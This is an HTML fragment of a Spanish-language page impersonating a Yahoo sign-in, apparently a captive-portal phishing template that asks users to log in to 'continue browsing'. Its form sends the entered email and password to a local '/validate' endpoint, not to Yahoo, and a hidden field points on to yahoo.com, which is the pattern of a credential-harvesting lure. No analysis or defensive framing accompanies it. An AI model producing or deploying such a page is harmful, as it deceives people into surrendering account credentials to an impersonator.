...
'>
        ...
        <h1 class='text-center login-title'>Accede con tu cuenta Yahoo para continuar navegando</h1>

          <form class='form-signin' action='/validate' method='GET'>

            <input id='eml' type='text' name='user' class='form-email' placeholder='Correo electrónico' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required><br>
            <input id='pwd' type='password' name='pass' class='form-password' placeholder='Contraseña' autocorrect='off' autocomplete='off' autocapitalize='off' required><br>
            <input type='hidden' name='url' value='yahoo.com'>
            <button id='btn' class='btn btn-primary btn-block btn-xlarge btn-sharp' name='login' type='submit'>Acceder</button>
            
            
            <div class='text-center terms-text1'><a href='#' class='url-color'>Trouble signing in?</a></div><br>
            <div class='text-center terms-text2'>Nuevo en Yahoo ?<a href='#' class='url-color'>Unirse a Yahoo</a></div>
